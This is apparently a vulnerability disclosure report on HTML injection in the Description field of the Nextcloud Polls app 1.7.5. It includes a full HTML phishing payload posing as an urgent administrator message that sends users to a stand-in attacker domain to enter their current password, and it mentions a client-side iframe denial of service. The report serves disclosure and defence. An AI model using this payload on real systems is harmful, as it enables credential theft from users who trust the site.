## Original Report

Hi everyone,

On latest version of Polls app (1.7.5), I noticed a lack of user input filtering for the "Description" part of the survey. An HTML injection is therefore possible. I tried to inject JavaScript code to get an XSS but I didn't succeed. Certainly someone better than me will be able to do it.

## Phishing

Knowing that you can inject HTML, you can do cool stuff like phishing with the following code : 

```
<br/> <br/><br/><br/><br/><br/><marquee><p style="color:red;"><b>!!!!! IMPORTANT message from Nextcloud administrator !!!!!!</b></p></marquee><br/><br/> A security issue was found last night.<br/> <p style="color:green;">Please go to manually on <a><b>changing-password.cloud.evil.com</a></b> to reset your password.</p> <b><p style="color:red;">Thank you in advance for doing so as soon as possible. </p></b><br/><br/><i>The IT team.</i></b><br/><br/> <br/><br/><br/> <b><marquee><p style="color:red;">!!!!! IMPORTANT message from Nextcloud administrator !!!!!!</b></p></marquee><br/><br/><br/><br/> <br/><br/>
```

And the website changing-password.cloud.evil.com would first ask for entering the user's current password, before he enters his new password => password retrieved from the attacker's server

## DoS (client side)

You can also make the user's PC spit by loading an infinite number of iframes.

## Impact

- Attract the user to redirect him to a malicious page and steal his personal identifiers
- Client-side DoS
- And many other things are possible by injecting HTML code at will and without filtering

In my opinion, I don't think it's a good thing to let the user add HTML code as he wants without being worried!
